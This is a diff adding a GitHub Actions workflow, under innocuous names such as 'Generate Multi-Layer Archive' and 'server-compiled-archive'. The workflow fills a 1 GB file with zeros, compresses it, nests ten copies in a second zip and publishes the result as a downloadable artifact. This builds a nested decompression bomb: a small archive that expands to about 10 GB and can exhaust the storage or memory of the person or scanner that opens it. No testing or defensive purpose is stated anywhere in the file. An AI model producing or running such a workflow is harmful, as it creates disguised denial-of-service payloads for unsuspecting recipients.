@@ -1,0 +1,35 @@
+name: Generate Multi-Layer Archive
+
+on:
+  workflow_dispatch: # Allows you to trigger it manually with a single click
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Create Base Data
+      run: |
+        # 1. Create a 1 GB text file consisting of zeros
+        dd if=/dev/zero of=data_block.txt bs=1M count=1000
+        
+        # 2. Compress it down perfectly using terminal zip tools
+        zip -9 layer1.zip data_block.txt
+        rm data_block.txt
+        
+    - name: Nest Archives
+      run: |
+        # 3. Create a folder and populate it with copies of the first layer
+        mkdir final_bundle
+        for i in {1..10}; do
+          cp layer1.zip final_bundle/nested_part_$i.zip
+        done
+        
+        # 4. Compress the folder into the final layer
+        zip -r -9 perfected_archive.zip final_bundle/
+        
+    - name: Upload File as Artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: server-compiled-archive
+        path: perfected_archive.zip
+        retention-days: 1
